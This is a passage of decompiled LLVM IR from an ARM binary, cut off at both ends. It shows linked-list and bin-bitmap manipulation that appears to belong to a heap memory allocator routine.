  %v2_12c1c = add i32 %v1_12c1c, 8
  %v3_12c1c = inttoptr i32 %v2_12c1c to i32*
  store i32 %v0_12c1c, i32* %v3_12c1c, align 4
  %v0_12c20 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c20 = load i32, i32* %ip.global-to-local, align 4
  %v2_12c20 = add i32 %v1_12c20, 12
  %v3_12c20 = inttoptr i32 %v2_12c20 to i32*
  store i32 %v0_12c20, i32* %v3_12c20, align 4
  br label %dec_label_pc_133d8

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12bd8
  store i32 %v0_12bb0, i32* %r0.global-to-local, align 4
  %v1_12c2c = call i32 @function_12a88(i32 %v0_12bb0)
  store i32 %v1_12c2c, i32* %r0.global-to-local, align 4
  %v0_12c30 = load i32, i32* @r4, align 4
  %v1_12c30 = and i32 %v0_12c30, 2
  %v2_12c30 = icmp eq i32 %v1_12c30, 0
  store i32 %v1_12c2c, i32* @r7, align 4
  br i1 %v2_12c30, label %dec_label_pc_12d88, label %dec_label_pc_12c3c

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12c28
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  %v4_12c44 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_12c44, i32* @r0, align 4
  %v0_12c48 = call i32 @function_134d0()
  store i32 %v0_12c48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d88

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12d9c
  %v1_12c50 = add i32 %v3_12d9c, 4
  %v2_12c50 = inttoptr i32 %v1_12c50 to i32*
  %v3_12c50 = load i32, i32* %v2_12c50, align 4
  store i32 %v3_12c50, i32* %r3.global-to-local, align 4
  %v0_12c54 = load i32, i32* @sl, align 4
  %v1_12c58 = and i32 %v3_12c50, -4
  store i32 %v1_12c58, i32* %r4.global-to-local, align 4
  %v1_12c5c = add i32 %v3_12d9c, 12
  %v2_12c5c = inttoptr i32 %v1_12c5c to i32*
  %v3_12c5c = load i32, i32* %v2_12c5c, align 4
  store i32 %v3_12c5c, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_12c54, 255
  br i1 %tmp203, label %dec_label_pc_12cb8, label %dec_label_pc_12c64

dec_label_pc_12c64:                               ; preds = %dec_label_pc_12c50
  %v9_12c64 = icmp eq i32 %v3_12c5c, %v0_12cbc
  br i1 %v9_12c64, label %dec_label_pc_12c6c, label %dec_label_pc_12cb8

dec_label_pc_12c6c:                               ; preds = %dec_label_pc_12c64
  %v0_12c6c = load i32, i32* @sb, align 4
  %v1_12c6c = add i32 %v0_12c6c, 48
  %v2_12c6c = inttoptr i32 %v1_12c6c to i32*
  %v3_12c6c = load i32, i32* %v2_12c6c, align 4
  store i32 %v3_12c6c, i32* %r3.global-to-local, align 4
  %v9_12c70 = icmp eq i32 %v3_12d9c, %v3_12c6c
  br i1 %v9_12c70, label %dec_label_pc_12c78, label %dec_label_pc_12cb8

dec_label_pc_12c78:                               ; preds = %dec_label_pc_12c6c
  %v1_12c78 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_12c58, %v1_12c78
  br i1 %tmp204, label %dec_label_pc_12c80, label %dec_label_pc_12cb8

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12c78
  %v2_12c80 = sub i32 %v1_12c58, %v0_12c54
  store i32 %v2_12c80, i32* %r2.global-to-local, align 4
  %v2_12c84 = add i32 %v0_12c54, %v3_12d9c
  store i32 %v2_12c84, i32* %r3.global-to-local, align 4
  %v1_12c88 = or i32 %v0_12c54, 1
  store i32 %v1_12c88, i32* %r0.global-to-local, align 4
  %v1_12c8c = or i32 %v2_12c80, 1
  store i32 %v1_12c8c, i32* %r1.global-to-local, align 4
  %v1_12c90 = add i32 %v3_12d9c, 8
  store i32 %v1_12c90, i32* %r4.global-to-local, align 4
  %v2_12c94 = add i32 %v0_12cbc, 8
  %v3_12c94 = inttoptr i32 %v2_12c94 to i32*
  store i32 %v2_12c84, i32* %v3_12c94, align 4
  %v0_12c98 = load i32, i32* %r3.global-to-local, align 4
  %v1_12c98 = load i32, i32* %ip.global-to-local, align 4
  %v2_12c98 = add i32 %v1_12c98, 12
  %v3_12c98 = inttoptr i32 %v2_12c98 to i32*
  store i32 %v0_12c98, i32* %v3_12c98, align 4
  %v0_12c9c = load i32, i32* %r0.global-to-local, align 4
  %v1_12c9c = load i32, i32* @r6, align 4
  %v2_12c9c = add i32 %v1_12c9c, 4
  %v3_12c9c = inttoptr i32 %v2_12c9c to i32*
  store i32 %v0_12c9c, i32* %v3_12c9c, align 4
  %v0_12ca0 = load i32, i32* %r3.global-to-local, align 4
  %v1_12ca0 = load i32, i32* @sb, align 4
  %v2_12ca0 = add i32 %v1_12ca0, 48
  %v3_12ca0 = inttoptr i32 %v2_12ca0 to i32*
  store i32 %v0_12ca0, i32* %v3_12ca0, align 4
  %v0_12ca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ca4 = load i32, i32* %r3.global-to-local, align 4
  %v3_12ca4 = add i32 %v1_12ca4, %v0_12ca4
  %v4_12ca4 = inttoptr i32 %v3_12ca4 to i32*
  store i32 %v0_12ca4, i32* %v4_12ca4, align 4
  %v0_12ca8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ca8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12ca8 = add i32 %v1_12ca8, 4
  %v3_12ca8 = inttoptr i32 %v2_12ca8 to i32*
  store i32 %v0_12ca8, i32* %v3_12ca8, align 4
  %v0_12cac = load i32, i32* %ip.global-to-local, align 4
  %v1_12cac = load i32, i32* %r3.global-to-local, align 4
  %v2_12cac = add i32 %v1_12cac, 12
  %v3_12cac = inttoptr i32 %v2_12cac to i32*
  store i32 %v0_12cac, i32* %v3_12cac, align 4
  %v0_12cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_12cb0 = load i32, i32* %r3.global-to-local, align 4
  %v2_12cb0 = add i32 %v1_12cb0, 8
  %v3_12cb0 = inttoptr i32 %v2_12cb0 to i32*
  store i32 %v0_12cb0, i32* %v3_12cb0, align 4
  br label %dec_label_pc_133d8

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12c78, %dec_label_pc_12c6c, %dec_label_pc_12c64, %dec_label_pc_12c50
  %v9_12cb8 = icmp eq i32 %v1_12c58, %v0_12c54
  %v2_12cbc = add i32 %v3_12c5c, 8
  %v3_12cbc = inttoptr i32 %v2_12cbc to i32*
  store i32 %v0_12cbc, i32* %v3_12cbc, align 4
  %v0_12cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_12cc0 = load i32, i32* %r5.global-to-local, align 4
  %v2_12cc0 = add i32 %v1_12cc0, 12
  %v3_12cc0 = inttoptr i32 %v2_12cc0 to i32*
  store i32 %v0_12cc0, i32* %v3_12cc0, align 4
  br i1 %v9_12cb8, label %dec_label_pc_12e18.loopexit, label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12cb8
  %v0_12cd4 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_12cd4, 255
  br i1 %tmp205, label %dec_label_pc_12cf8, label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cd4
  store i32 144312, i32* %r2.global-to-local, align 4
  %v1_12ce0 = load i32, i32* %r8.global-to-local, align 4
  %v2_12ce0 = add i32 %v1_12ce0, 144312
  %v3_12ce0 = inttoptr i32 %v2_12ce0 to i32*
  %v4_12ce0 = load i32, i32* %v3_12ce0, align 4
  %v3_12ce4 = udiv i32 %v0_12cd4, 8
  store i32 %v3_12ce4, i32* %r0.global-to-local, align 4
  %v4_12ce8 = mul nuw i32 %v3_12ce4, 8
  %v5_12ce8 = add i32 %v4_12ce0, %v4_12ce8
  store i32 %v5_12ce8, i32* %r3.global-to-local, align 4
  %v1_12cec = add i32 %v5_12ce8, 44
  store i32 %v1_12cec, i32* %ip.global-to-local, align 4
  %v1_12cf0 = add i32 %v5_12ce8, 52
  %v2_12cf0 = inttoptr i32 %v1_12cf0 to i32*
  %v3_12cf0 = load i32, i32* %v2_12cf0, align 4
  store i32 %v3_12cf0, i32* @lr, align 4
  br label %dec_label_pc_12d50

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cd4
  store i32 %v0_12cd4, i32* %r0.global-to-local, align 4
  %v1_12cfc = call i32 @function_12a88(i32 %v0_12cd4)
  store i32 %v1_12cfc, i32* %r0.global-to-local, align 4
  store i32 144312, i32* %ip.global-to-local, align 4
  %v1_12d04 = load i32, i32* %r8.global-to-local, align 4
  %v2_12d04 = add i32 %v1_12d04, 144312
  %v3_12d04 = inttoptr i32 %v2_12d04 to i32*
  %v4_12d04 = load i32, i32* %v3_12d04, align 4
  %v4_12d08 = mul i32 %v1_12cfc, 8
  %v5_12d08 = add i32 %v4_12d04, %v4_12d08
  store i32 %v5_12d08, i32* %r3.global-to-local, align 4
  %v1_12d0c = add i32 %v5_12d08, 44
  store i32 %v1_12d0c, i32* %ip.global-to-local, align 4
  %v1_12d10 = add i32 %v5_12d08, 52
  %v2_12d10 = inttoptr i32 %v1_12d10 to i32*
  %v3_12d10 = load i32, i32* %v2_12d10, align 4
  store i32 %v3_12d10, i32* @lr, align 4
  %v9_12d14 = icmp eq i32 %v3_12d10, %v1_12d0c
  br i1 %v9_12d14, label %dec_label_pc_12d50, label %dec_label_pc_12d1c

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12cf8
  %v1_12d1c = add i32 %v5_12d08, 56
  %v2_12d1c = inttoptr i32 %v1_12d1c to i32*
  %v3_12d1c = load i32, i32* %v2_12d1c, align 4
  store i32 %v3_12d1c, i32* %r1.global-to-local, align 4
  %v1_12d20 = add i32 %v3_12d1c, 4
  %v2_12d20 = inttoptr i32 %v1_12d20 to i32*
  %v3_12d20 = load i32, i32* %v2_12d20, align 4
  store i32 %v3_12d20, i32* %r3.global-to-local, align 4
  %v0_12d24 = load i32, i32* %r4.global-to-local, align 4
  %v3_12d24 = icmp ult i32 %v0_12d24, %v3_12d20
  br i1 %v3_12d24, label %.thread, label %dec_label_pc_12d40.preheader

.thread:                                          ; preds = %dec_label_pc_12d1c
  store i32 %v1_12d0c, i32* @lr, align 4
  store i32 %v3_12d1c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d50

dec_label_pc_12d40.preheader:                     ; preds = %dec_label_pc_12d1c
  %v2_12d2c = or i32 %v0_12d24, 1
  store i32 %v2_12d2c, i32* %r2.global-to-local, align 4
  %v1_12d40179 = add i32 %v3_12d10, 4
  %v2_12d40180 = inttoptr i32 %v1_12d40179 to i32*
  %v3_12d40181 = load i32, i32* %v2_12d40180, align 4
  store i32 %v3_12d40181, i32* %r3.global-to-local, align 4
  %v3_12d44183 = icmp ult i32 %v2_12d2c, %v3_12d40181
  br i1 %v3_12d44183, label %dec_label_pc_12d3c, label %dec_label_pc_12d4c

dec_label_pc_12d3c:                               ; preds = %dec_label_pc_12d40.preheader, %dec_label_pc_12d3c
  %v0_12d4c184 = phi i32 [ %v3_12d3c, %dec_label_pc_12d3c ], [ %v3_12d10, %dec_label_pc_12d40.preheader ]
  %v1_12d3c = add i32 %v0_12d4c184, 8
  %v2_12d3c = inttoptr i32 %v1_12d3c to i32*
  %v3_12d3c = load i32, i32* %v2_12d3c, align 4
  store i32 %v3_12d3c, i32* @lr, align 4
  %v1_12d40 = add i32 %v3_12d3c, 4
  %v2_12d40 = inttoptr i32 %v1_12d40 to i32*
  %v3_12d40 = load i32, i32* %v2_12d40, align 4
  store i32 %v3_12d40, i32* %r3.global-to-local, align 4
  %v3_12d44 = icmp ult i32 %v2_12d2c, %v3_12d40
  br i1 %v3_12d44, label %dec_label_pc_12d3c, label %dec_label_pc_12d4c

dec_label_pc_12d4c:                               ; preds = %dec_label_pc_12d3c, %dec_label_pc_12d40.preheader
  %v0_12d4c.lcssa = phi i32 [ %v3_12d10, %dec_label_pc_12d40.preheader ], [ %v3_12d3c, %dec_label_pc_12d3c ]
  %v1_12d4c = add i32 %v0_12d4c.lcssa, 12
  %v2_12d4c = inttoptr i32 %v1_12d4c to i32*
  %v3_12d4c = load i32, i32* %v2_12d4c, align 4
  store i32 %v3_12d4c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d50

dec_label_pc_12d50:                               ; preds = %.thread, %dec_label_pc_12cf8, %dec_label_pc_12cdc, %dec_label_pc_12d4c
  %v0_12d70 = phi i32 [ %v1_12d0c, %dec_label_pc_12cf8 ], [ %v1_12cec, %dec_label_pc_12cdc ], [ %v3_12d4c, %dec_label_pc_12d4c ], [ %v3_12d1c, %.thread ]
  %v0_12d64 = phi i32 [ %v1_12cfc, %dec_label_pc_12cf8 ], [ %v3_12ce4, %dec_label_pc_12cdc ], [ %v1_12cfc, %dec_label_pc_12d4c ], [ %v1_12cfc, %.thread ]
  %v1_12d54 = phi i32 [ %v1_12d04, %dec_label_pc_12cf8 ], [ %v1_12ce0, %dec_label_pc_12cdc ], [ %v1_12d04, %dec_label_pc_12d4c ], [ %v1_12d04, %.thread ]
  store i32 144312, i32* %r2.global-to-local, align 4
  %v2_12d54 = add i32 %v1_12d54, 144312
  %v3_12d54 = inttoptr i32 %v2_12d54 to i32*
  %v4_12d54 = load i32, i32* %v3_12d54, align 4
  %v3_12d58 = sdiv i32 %v0_12d64, 32
  store i32 %v3_12d58, i32* %r3.global-to-local, align 4
  %v4_12d5c = mul nsw i32 %v3_12d58, 4
  %v5_12d5c = add i32 %v4_12d54, %v4_12d5c
  store i32 %v5_12d5c, i32* %r1.global-to-local, align 4
  %v1_12d60 = add i32 %v5_12d5c, 820
  %v2_12d60 = inttoptr i32 %v1_12d60 to i32*
  %v3_12d60 = load i32, i32* %v2_12d60, align 4
  %v1_12d64 = urem i32 %v0_12d64, 32
  store i32 %v1_12d64, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_12d6c = shl i32 1, %v1_12d64
  %v8_12d6c = or i32 %v3_12d60, %v7_12d6c
  store i32 %v8_12d6c, i32* %r3.global-to-local, align 4
  %v1_12d70 = load i32, i32* @r6, align 4
  %v2_12d70 = add i32 %v1_12d70, 12
  %v3_12d70 = inttoptr i32 %v2_12d70 to i32*
  store i32 %v0_12d70, i32* %v3_12d70, align 4
  %v0_12d74 = load i32, i32* @lr, align 4
  %v1_12d74 = load i32, i32* @r6, align 4
  %v2_12d74 = add i32 %v1_12d74, 8
  %v3_12d74 = inttoptr i32 %v2_12d74 to i32*
  store i32 %v0_12d74, i32* %v3_12d74, align 4
  %v0_12d78 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d78 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d78 = add i32 %v1_12d78, 820
  %v3_12d78 = inttoptr i32 %v2_12d78 to i32*
  store i32 %v0_12d78, i32* %v3_12d78, align 4
  %v0_12d7c = load i32, i32* @r6, align 4
  %v1_12d7c = load i32, i32* @lr, align 4
  %v2_12d7c = add i32 %v1_12d7c, 12
  %v3_12d7c = inttoptr i32 %v2_12d7c to i32*
  store i32 %v0_12d7c, i32* %v3_12d7c, align 4
  %v0_12d80 = load i32, i32* @r6, align 4
  %v1_12d80 = load i32, i32* %ip.global-to-local, align 4
  %v2_12d80 = add i32 %v1_12d80, 8
  %v3_12d80 = inttoptr i32 %v2_12d80 to i32*
  store i32 %v0_12d80, i32* %v3_12d80, align 4
  %v0_12d9c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12d9c

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12c28, %dec_label_pc_12be0, %dec_label_pc_12c3c
  store i32 36, i32* %r8.global-to-local, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  %v4_12d90 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_12d90, i32* @sb, align 4
  %v0_12d94 = load i32, i32* @sl, align 4
  %v1_12d94 = add i32 %v0_12d94, 16
  store i32 %v1_12d94, i32* @fp, align 4
  %v1_12d98 = add i32 %v4_12d90, 52
  store i32 %v1_12d98, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12d9c

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d50, %dec_label_pc_12d88
  %v0_12cbc = phi i32 [ %v0_12d9c.pre, %dec_label_pc_12d50 ], [ %v1_12d98, %dec_label_pc_12d88 ]
  %v1_12d9c = add i32 %v0_12cbc, 12
  %v2_12d9c = inttoptr i32 %v1_12d9c to i32*
  %v3_12d9c = load i32, i32* %v2_12d9c, align 4
  store i32 %v3_12d9c, i32* @r6, align 4
  %v9_12da0 = icmp eq i32 %v3_12d9c, %v0_12cbc
  br i1 %v9_12da0, label %dec_label_pc_12da8, label %dec_label_pc_12c50

dec_label_pc_12da8:                               ; preds = %dec_label_pc_12d9c
  %v0_12da8 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_12da8, 256
  %v0_12e60.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_12da8.dec_label_pc_12e60_crit_edge, label %dec_label_pc_12db0

dec_label_pc_12da8.dec_label_pc_12e60_crit_edge:  ; preds = %dec_label_pc_12da8
  %.pre200 = mul i32 %v0_12e60.pre, 8
  br label %dec_label_pc_12e60

dec_label_pc_12db0:                               ; preds = %dec_label_pc_12da8
  %v4_12db0 = mul i32 %v0_12e60.pre, 8
  %v5_12db0 = add i32 %v4_12db0, %v0_12cbc
  store i32 %v5_12db0, i32* %r3.global-to-local, align 4
  %v1_12db4 = add i32 %v5_12db0, -8
  store i32 %v1_12db4, i32* %r1.global-to-local, align 4
  %v1_12db8 = add i32 %v5_12db0, 4
  %v2_12db8 = inttoptr i32 %v1_12db8 to i32*
  %storemerge.pre = load i32, i32* %v2_12db8, align 4
  br label %dec_label_pc_12e58

dec_label_pc_12dc0:                               ; preds = %dec_label_pc_12e58
  %v1_12dc0 = add i32 %v1_12de8, 4
  %v2_12dc0 = inttoptr i32 %v1_12dc0 to i32*
  %v3_12dc0 = load i32, i32* %v2_12dc0, align 4
  store i32 %v3_12dc0, i32* %r3.global-to-local, align 4
  %v1_12dc4 = and i32 %v3_12dc0, -4
  store i32 %v1_12dc4, i32* %r2.global-to-local, align 4
  %v3_12dc8 = icmp ult i32 %v1_12dc4, %v0_12da8
  %v1_12dcc = add i32 %v1_12de8, 12
  %v2_12dcc = inttoptr i32 %v1_12dcc to i32*
  %v3_12dcc = load i32, i32* %v2_12dcc, align 4
  store i32 %v3_12dcc, i32* %r0.global-to-local, align 4
  br i1 %v3_12dc8, label %dec_label_pc_12e58, label %dec_label_pc_12dd4

dec_label_pc_12dd4:                               ; preds = %dec_label_pc_12dc0
  %v1_12dd4 = add i32 %v1_12de8, 8
  %v2_12dd4 = inttoptr i32 %v1_12dd4 to i32*
  %v3_12dd4 = load i32, i32* %v2_12dd4, align 4
  store i32 %v3_12dd4, i32* %r1.global-to-local, align 4
  %v1_12dd8 = add i32 %v3_12dd4, 12
  %v2_12dd8 = inttoptr i32 %v1_12dd8 to i32*
  %v3_12dd8 = load i32, i32* %v2_12dd8, align 4
  store i32 %v3_12dd8, i32* %r3.global-to-local, align 4
  %v9_12ddc = icmp eq i32 %v3_12dd8, %v1_12de8
  br i1 %v9_12ddc, label %dec_label_pc_12de4, label %dec_label_pc_12df0

dec_label_pc_12de4:                               ; preds = %dec_label_pc_12dd4
  %v1_12de4 = add i32 %v3_12dcc, 8
  %v2_12de4 = inttoptr i32 %v1_12de4 to i32*
  %v3_12de4 = load i32, i32* %v2_12de4, align 4
  store i32 %v3_12de4, i32* %r3.global-to-local, align 4
  %v9_12de8 = icmp eq i32 %v3_12de4, %v1_12de8
  br i1 %v9_12de8, label %dec_label_pc_12df4, label %dec_label_pc_12df0

dec_label_pc_12df0:                               ; preds = %dec_label_pc_12dd4, %dec_label_pc_12de4
  %v0_12df0 = call i32 @function_13900()
  store i32 %v0_12df0, i32* %r0.global-to-local, align 4
  %v0_12df4.pre = load i32, i32* @sl, align 4
  %v1_12df4.pre = load i32, i32* @r2, align 4
  %v0_12dfc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12df4

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12de4, %dec_label_pc_12df0
  %v1_12dfc = phi i32 [ %v3_12dcc, %dec_label_pc_12de4 ], [ %v0_12df0, %dec_label_pc_12df0 ]
  %v0_12dfc = phi i32 [ %v3_12dd4, %dec_label_pc_12de4 ], [ %v0_12dfc.pre, %dec_label_pc_12df0 ]
  %v1_12df4 = phi i32 [ %v1_12dc4, %dec_label_pc_12de4 ], [ %v1_12df4.pre, %dec_label_pc_12df0 ]
  %v0_12df4 = phi i32 [ %v0_12da8, %dec_label_pc_12de4 ], [ %v0_12df4.pre, %dec_label_pc_12df0 ]
  %v2_12df4 = sub i32 %v1_12df4, %v0_12df4
  store i32 %v2_12df4, i32* %lr.global-to-local, align 4
  %v2_12dfc = add i32 %v1_12dfc, 8
  %v3_12dfc = inttoptr i32 %v2_12dfc to i32*
  store i32 %v0_12dfc, i32* %v3_12dfc, align 4
  %v0_12e00 = load i32, i32* %r0.global-to-local, align 4
  %v1_12e00 = load i32, i32* %r1.global-to-local, align 4
  %v2_12e00 = add i32 %v1_12e00, 12
  %v3_12e00 = inttoptr i32 %v2_12e00 to i32*
  store i32 %v0_12e00, i32* %v3_12e00, align 4
  %v0_12e04 = load i32, i32* %ip.global-to-local, align 4
  %v1_12e04 = add i32 %v0_12e04, 8
  store i32 %v1_12e04, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_12df4, 15
  br i1 %tmp207, label %dec_label_pc_12e24, label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12df4
  %v1_12e0c = load i32, i32* %r2.global-to-local, align 4
  %v2_12e0c = add i32 %v1_12e0c, %v0_12e04
  store i32 %v2_12e0c, i32* %r2.global-to-local, align 4
  %v1_12e10 = add i32 %v2_12e0c, 4
  %v2_12e10 = inttoptr i32 %v1_12e10 to i32*
  %v3_12e10 = load i32, i32* %v2_12e10, align 4
  store i32 %v3_12e10, i32* %r3.global-to-local, align 4
  store i32 %v1_12e04, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12e18.loopexit:                      ; preds = %dec_label_pc_12cb8
  %v1_12cc4 = load i32, i32* @r6, align 4
  %v2_12cc4 = load i32, i32* @sl, align 4
  %v3_12cc4 = add i32 %v2_12cc4, %v1_12cc4
  store i32 %v3_12cc4, i32* %r2.global-to-local, align 4
  %v2_12cc8 = add i32 %v3_12cc4, 4
  %v3_12cc8 = inttoptr i32 %v2_12cc8 to i32*
  %v4_12cc8 = load i32, i32* %v3_12cc8, align 4
  store i32 %v4_12cc8, i32* %r3.global-to-local, align 4
  %v2_12ccc = add i32 %v1_12cc4, 8
  store i32 %v2_12ccc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %.dec_label_pc_12e18_crit_edge, %dec_label_pc_12e18.loopexit, %dec_label_pc_12e0c
  %v1_12e1c = phi i32 [ %v4_12f40, %.dec_label_pc_12e18_crit_edge ], [ %v3_12cc4, %dec_label_pc_12e18.loopexit ], [ %v2_12e0c, %dec_label_pc_12e0c ]
  %v0_12e18 = phi i32 [ %v7_12f40, %.dec_label_pc_12e18_crit_edge ], [ %v4_12cc8, %dec_label_pc_12e18.loopexit ], [ %v3_12e10, %dec_label_pc_12e0c ]
  %v1_12e18 = or i32 %v0_12e18, 1
  store i32 %v1_12e18, i32* %r3.global-to-local, align 4
  %v2_12e1c = add i32 %v1_12e1c, 4
  %v3_12e1c = inttoptr i32 %v2_12e1c to i32*
  store i32 %v1_12e18, i32* %v3_12e1c, align 4
  br label %dec_label_pc_133d8

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12df4
  %v1_12e24 = load i32, i32* @sl, align 4
  %v2_12e24 = add i32 %v1_12e24, %v0_12e04
  store i32 %v2_12e24, i32* %r2.global-to-local, align 4
  %v1_12e28 = or i32 %v1_12e24, 1
  store i32 %v1_12e28, i32* %r3.global-to-local, align 4
  %v0_12e2c = load i32, i32* %lr.global-to-local, align 4
  %v1_12e2c = or i32 %v0_12e2c, 1
  store i32 %v1_12e2c, i32* %r1.global-to-local, align 4
  store i32 %v1_12e04, i32* %r4.global-to-local, align 4
  %v2_12e34 = add i32 %v0_12e04, 4
  %v3_12e34 = inttoptr i32 %v2_12e34 to i32*
  store i32 %v1_12e28, i32* %v3_12e34, align 4
  %v0_12e38 = load i32, i32* %r2.global-to-local, align 4
  %v1_12e38 = load i32, i32* @r6, align 4
  %v2_12e38 = add i32 %v1_12e38, 8
  %v3_12e38 = inttoptr i32 %v2_12e38 to i32*
  store i32 %v0_12e38, i32* %v3_12e38, align 4
  %v0_12e3c = load i32, i32* %r2.global-to-local, align 4
  %v1_12e3c = load i32, i32* @r6, align 4
  %v2_12e3c = add i32 %v1_12e3c, 12
  %v3_12e3c = inttoptr i32 %v2_12e3c to i32*
  store i32 %v0_12e3c, i32* %v3_12e3c, align 4
  %v0_12e40 = load i32, i32* %lr.global-to-local, align 4
  %v1_12e40 = load i32, i32* %r2.global-to-local, align 4
  %v3_12e40 = add i32 %v1_12e40, %v0_12e40
  %v4_12e40 = inttoptr i32 %v3_12e40 to i32*
  store i32 %v0_12e40, i32* %v4_12e40, align 4
  %v0_12e44 = load i32, i32* %r1.global-to-local, align 4
  %v1_12e44 = load i32, i32* %r2.global-to-local, align 4
  %v2_12e44 = add i32 %v1_12e44, 4
  %v3_12e44 = inttoptr i32 %v2_12e44 to i32*
  store i32 %v0_12e44, i32* %v3_12e44, align 4
  %v0_12e48 = load i32, i32* @r6, align 4
  %v1_12e48 = load i32, i32* %r2.global-to-local, align 4
  %v2_12e48 = add i32 %v1_12e48, 12
  %v3_12e48 = inttoptr i32 %v2_12e48 to i32*
  store i32 %v0_12e48, i32* %v3_12e48, align 4
  %v0_12e4c = load i32, i32* @r6, align 4
  %v1_12e4c = load i32, i32* %r2.global-to-local, align 4
  %v2_12e4c = add i32 %v1_12e4c, 8
  %v3_12e4c = inttoptr i32 %v2_12e4c to i32*
  store i32 %v0_12e4c, i32* %v3_12e4c, align 4
  br label %dec_label_pc_133d8

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12dc0, %dec_label_pc_12db0
  %v1_12de8 = phi i32 [ %storemerge.pre, %dec_label_pc_12db0 ], [ %v3_12dcc, %dec_label_pc_12dc0 ]
  store i32 %v1_12de8, i32* %ip.global-to-local, align 4
  %v9_12e58 = icmp eq i32 %v1_12de8, %v1_12db4
  br i1 %v9_12e58, label %dec_label_pc_12e60.loopexit, label %dec_label_pc_12dc0

dec_label_pc_12e60.loopexit:                      ; preds = %dec_label_pc_12e58
  br label %dec_label_pc_12e60

dec_label_pc_12e60:                               ; preds = %dec_label_pc_12da8.dec_label_pc_12e60_crit_edge, %dec_label_pc_12e60.loopexit
  %v4_12e90.pre-phi = phi i32 [ %.pre200, %dec_label_pc_12da8.dec_label_pc_12e60_crit_edge ], [ %v4_12db0, %dec_label_pc_12e60.loopexit ]
  %v1_12e60 = add i32 %v0_12e60.pre, 1
  store i32 %v1_12e60, i32* %r2.global-to-local, align 4
  %v1_12e64 = urem i32 %v1_12e60, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 144312, i32* %r0.global-to-local, align 4
  %v6_12e70 = shl i32 1, %v1_12e64
  store i32 %v6_12e70, i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_12e78 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_12e78, i32* %r3.global-to-local, align 4
  %v3_12e7c = udiv i32 %v1_12e60, 32
  store i32 %v3_12e7c, i32* @r5, align 4
  %v4_12e80 = mul nuw nsw i32 %v3_12e7c, 4
  %v5_12e80 = add i32 %v4_12e78, %v4_12e80
  store i32 %v5_12e80, i32* %r2.global-to-local, align 4
  %v1_12e84 = add i32 %v5_12e80, 820
  %v2_12e84 = inttoptr i32 %v1_12e84 to i32*
  %v3_12e84 = load i32, i32* %v2_12e84, align 4
  store i32 %v3_12e84, i32* @r4, align 4
  %v1_12e88 = add i32 %v4_12e78, 52
  store i32 %v1_12e88, i32* %r3.global-to-local, align 4
  store i32 36, i32* @r8, align 4
  %v5_12e90 = add i32 %v1_12e88, %v4_12e90.pre-phi
  store i32 %v5_12e90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12efc, %dec_label_pc_12e60
  %v1_12e9c = phi i32 [ %v1_12e9c.pre, %dec_label_pc_12efc ], [ %v3_12e84, %dec_label_pc_12e60 ]
  %v0_12e9c = phi i32 [ %v0_12e94.pre, %dec_label_pc_12efc ], [ %v6_12e70, %dec_label_pc_12e60 ]
  %v1_12e94 = sub i32 1, %v0_12e9c
  %v2_12e94 = icmp ult i32 %v0_12e9c, 2
  %v1_12e94. = select i1 %v2_12e94, i32 %v1_12e94, i32 0
  store i32 %v1_12e94., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_12e9c, %v1_12e9c
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_12e94
  %v5_12ea0 = or i32 %v1_12e94., 1
  store i32 %v5_12ea0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12eac.preheader

bb142:                                            ; preds = %dec_label_pc_12e94
  %v2_12ea4 = icmp eq i32 %v1_12e94., 0
  br i1 %v2_12ea4, label %.dec_label_pc_12ee8.preheader_crit_edge, label %dec_label_pc_12eac.preheader
